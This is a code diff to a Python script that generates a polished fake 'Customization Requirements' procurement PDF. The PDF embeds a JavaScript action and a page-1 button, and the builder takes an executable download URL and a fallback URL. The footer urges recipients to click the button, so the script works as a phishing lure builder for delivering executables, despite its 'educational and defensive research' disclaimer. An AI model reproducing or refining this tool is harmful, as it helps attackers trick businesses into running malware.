@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-V305 "THE SUPPLIER CONFIRMATION" – PROFESSIONAL PREMIUM HYBRID PDF
+V305 "THE SUPPLIER CONFIRMATION" – PROFESSIONAL PREMIUM HYBRID PDF (FIXED)
 ================================================================================
 (c) 2026 The Architect. For Educational and Defensive Research Only.
 ================================================================================
@@ -169,7 +169,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     width, height = A4
     margin = 50
 
-    # Color palette
     primary_dark = colors.HexColor("#0B1E3B")
     primary_mid = colors.HexColor("#1E3A6E")
     accent = colors.HexColor("#2E75B6")
@@ -177,23 +176,17 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     white = colors.white
     gray_light = colors.HexColor("#E0E6ED")
     gray_dark = colors.HexColor("#666666")
-    green = colors.HexColor("#2E8B57")
-    red = colors.HexColor("#B22222")
 
-    # === PAGE 1 ===
-    # Background
+    # Page 1
     c.setFillColor(light_bg)
     c.rect(0, 0, width, height, fill=1, stroke=0)
 
-    # Header band
     c.setFillColor(primary_dark)
     c.rect(0, height-90, width, 90, fill=1, stroke=0)
 
-    # Subtle accent line under header
     c.setFillColor(accent)
     c.rect(0, height-94, width, 4, fill=1, stroke=0)
 
-    # Company "logo" – simple geometric mark
     c.setFillColor(white)
     c.circle(75, height-45, 20, fill=1, stroke=0)
     c.setFillColor(primary_mid)
@@ -206,14 +199,12 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     c.setFont("Helvetica", 8)
     c.drawString(105, height-62, "Global Procurement Division")
 
-    # "Secured" badge on right
     c.setFillColor(primary_mid)
     c.roundRect(width-120, height-65, 100, 30, 15, fill=1, stroke=0)
     c.setFillColor(white)
     c.setFont("Helvetica-Bold", 9)
     c.drawCentredString(width-70, height-52, "🔒 Secured")
 
-    # Title block
     c.setFillColor(primary_dark)
     c.setFont("Helvetica-Bold", 26)
     c.drawString(margin, height-150, "Customization Requirements")
@@ -222,12 +213,10 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     c.setFillColor(gray_dark)
     c.drawString(margin, height-205, "A formal request from the buyer to the supplier for product customization.")
 
-    # Decorative divider
     c.setStrokeColor(accent)
     c.setLineWidth(1.5)
     c.line(margin, height-215, width-margin, height-215)
 
-    # Letter content
     c.setFillColor(colors.black)
     c.setFont("Helvetica", 12)
     c.drawString(margin, height-250, f"Dear {supplier} Team,")
@@ -243,7 +232,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         c.drawString(margin, y, line)
         y -= 18
 
-    # Document details card
     card_x = margin
     card_y = y - 40
     card_w = width - 2*margin
@@ -274,19 +262,16 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     c.setFont("Helvetica", 11)
     c.drawString(card_x+20, card_y+10, expiry)
 
-    # Footer
     c.setFillColor(gray_dark)
     c.setFont("Helvetica", 8)
     c.drawString(margin, 40, "This document contains proprietary information. Please confirm receipt and compliance.")
     c.drawString(margin, 25, f"{buyer} | procurement@{buyer.lower().replace(' ', '')}.com | +1 (555) 123-4567")
 
-    # === PAGE 2 ===
+    # Page 2
     c.showPage()
-    # Background
     c.setFillColor(light_bg)
     c.rect(0, 0, width, height, fill=1, stroke=0)
 
-    # Header band smaller
     c.setFillColor(primary_dark)
     c.rect(0, height-50, width, 50, fill=1, stroke=0)
     c.setFillColor(accent)
@@ -298,7 +283,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     c.setFillColor(gray_dark)
     c.drawString(margin, height-65, f"Document No.: {doc_no}  |  Date: {date_str}")
 
-    # Requirements table with premium styling
     data = [
         ["Category", "Requirement", "Status", "Priority"],
         ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
@@ -315,7 +299,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         ["Compliance", "Conflict-free minerals declaration", "Required", "Medium"],
     ]
 
-    # Adjust column widths for better fit
     table = Table(data, colWidths=[80, 210, 70, 60])
     table.setStyle(TableStyle([
         ('BACKGROUND', (0,0), (-1,0), primary_dark),
@@ -335,7 +318,6 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     table.wrapOn(c, width-2*margin, height-250)
     table.drawOn(c, margin, height-300)
 
-    # Footer
     c.setFillColor(gray_dark)
     c.setFont("Helvetica", 8)
     c.drawString(margin, 40, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
@@ -359,7 +341,7 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         "/JS": String(browser_js)
     })
 
-    # Button on page 1 – centered, premium look
+    # Button on page 1
     page1 = pdf.pages[0]
     btn_width = 260
     btn_height = 42
@@ -388,20 +370,16 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         "/H": "/P",
         "/DA": "/Helv 12 Tf 1 1 1 rg",
         "/DR": {"/Font": {"/Helv": helv_font}},
-        "/P": page1,
         "/AP": {}
     }
 
-    # Premium appearance stream with gradient-like effect and shadow
+    # Premium appearance stream
     ap_content = f"""
     q
-    % Shadow
     0.7 0.7 0.7 rg
     1 1 1 1 re
-    % Main button (rounded rectangle simulated by overlapping)
     0.15 0.45 0.7 rg
     2 2 {btn_width-4} {btn_height-4} re f
-    % Highlight top
     0.25 0.55 0.8 rg
     2 {btn_height-12} {btn_width-4} 10 re f
     Q
